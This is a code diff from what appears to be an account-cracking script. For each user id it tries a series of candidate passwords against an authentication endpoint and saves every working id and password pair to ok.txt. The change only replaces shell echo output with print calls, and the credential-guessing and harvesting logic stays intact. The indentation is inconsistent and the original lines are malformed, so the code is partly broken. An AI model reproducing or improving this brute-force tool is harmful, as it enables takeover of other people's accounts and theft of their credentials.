@@ -349,7 +349,7 @@ def b_menu_select():
 		    data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass1, headers = header).text
                     q = json.loads(data)
                     if 'loc' in q:
-		    os.system('echo -e "\x1b[1;92m[SANI-OK]➤ '+uid+' | '+pass1+' | '+name)"| lolcat')
+		        print("\x1b[1;92m[SANI-OK] "+uid+" | "+pass1+" | "+name)
 		        ok=open("ok.txt","a")
 		        ok.write(uid+" | "+pass1+"\n")
 		        ok.close()
@@ -359,7 +359,7 @@ def b_menu_select():
 		        data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass2, headers = header).text
                         q = json.loads(data)
 		        if 'loc' in q:
-		            os.system('echo -e "\x1b[1;92m[SANI-OK]➤ '+uid+' | '+pass2+' | '+name"| lolcat')
+		            print("\x1b[1;92m[SANI-OK] "+uid+" | "+pass2+" | "+name)
 		            ok=open("ok.txt","a")
 		            ok.write(uid+" | "+pass2+"\n")
 		            ok.close()
@@ -369,7 +369,7 @@ def b_menu_select():
 		            data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass3, headers = header).text
                             q = json.loads(data)
 		            if 'loc' in q:
-		                os.system('echo -e "\x1b[1;92m[SANI-OK]➤ '+uid+' | '+pass3+' | '+name"| lolcat')
+		                print("\x1b[1;92m[SANI-OK] "+uid+" | "+pass3+" | "+name)
 		                ok=open("ok.txt","a")
 		                ok.write(uid+" | "+pass3+"\n")
 		                ok.close()
@@ -379,7 +379,7 @@ def b_menu_select():
 		                data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass4, headers = header).text
                                 q = json.loads(data)
 		    	        if 'loc' in q:
-		                    os.system('echo -e "\x1b[1;92m[SANI-OK]➤ '+uid+' | '+pass4+' | '+name"| lolcat')
+		                    print("\x1b[1;92m[SANI-OK] "+uid+" | "+pass4+" | "+name)
 		                    ok=open("ok.txt","a")
 		                    ok.write(uid+" | "+pass4+"\n")
 		                    ok.close()
@@ -389,7 +389,7 @@ def b_menu_select():
 		                    data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass5, headers = header).text
                                     q = json.loads(data)
 		                    if 'loc' in q:
-		                        os.system('echo -e "\x1b[1;92m[SANI-OK]➤ '+uid+' | '+pass5+' | '+name"| lolcat')
+		                        print("\x1b[1;92m[SANI-OK] "+uid+" | "+pass5+" | "+name)
 		                        ok=open("ok.txt","a")
 		                        ok.write(uid+" | "+pass5+"\n")
 		                        ok.close()
@@ -399,7 +399,7 @@ def b_menu_select():
 		                        data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass6, headers = header).text
                                         q = json.loads(data)
 		                        if 'loc' in q:
-		                            os.system('echo -e "\x1b[1;92m[SANI-OK]➤ '+uid+' | '+pass6+' | '+name"| lolcat')
+		                            print("\x1b[1;92m[SANI-OK] "+uid+" | "+pass6+" | "+name)
 		                            ok=open("ok.txt","a")
 		                            ok.write(uid+" | "+pass6+"\n")
 		                            ok.close()
@@ -409,7 +409,7 @@ def b_menu_select():
 		                            data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass7, headers = header).text
                                             q = json.loads(data)
 					    if 'loc' in q:
-		                                os.system('echo -e "\x1b[1;92m[SANI-OK]➤ '+uid+' | '+pass7+' | '+name"| lolcat')
+		                                print("\x1b[1;92m[SANI-OK] "+uid+" | "+pass7+" | "+name)
 		                                ok=open("ok.txt","a")
 		                                ok.write(uid+" | "+pass7+"\n")
 		                                ok.close()
@@ -419,7 +419,7 @@ def b_menu_select():
 		                                data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass8, headers = header).text
                                                 q = json.loads(data)
 		    	                        if 'loc' in q:
-		                                    os.system('echo -e "\x1b[1;92m[SANI-OK]➤ '+uid+' | '+pass8+' | '+name"| lolcat')
+		                                    print("\x1b[1;92m[SANI-OK] "+uid+" | "+pass8+" | "+name)
 		                                    ok=open("ok.txt","a")
 		                                    ok.write(uid+" | "+pass8+"\n")
 		                                    ok.close()
@@ -429,7 +429,7 @@ def b_menu_select():
 		                                    data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass9, headers = header).text
                                                     q = json.loads(data)
 		                                    if 'loc' in q:
-		                                        os.system('echo -e "\x1b[1;92m[SANI-OK]➤ '+uid+' | '+pass9+' | '+name"| lolcat')
+		                                        print("\x1b[1;92m[SANI-OK] "+uid+" | "+pass9+" | "+name)
 		                                        ok=open("ok.txt","a")
 		                                        ok.write(uid+" | "+pass9+"\n")
 		                                        ok.close()
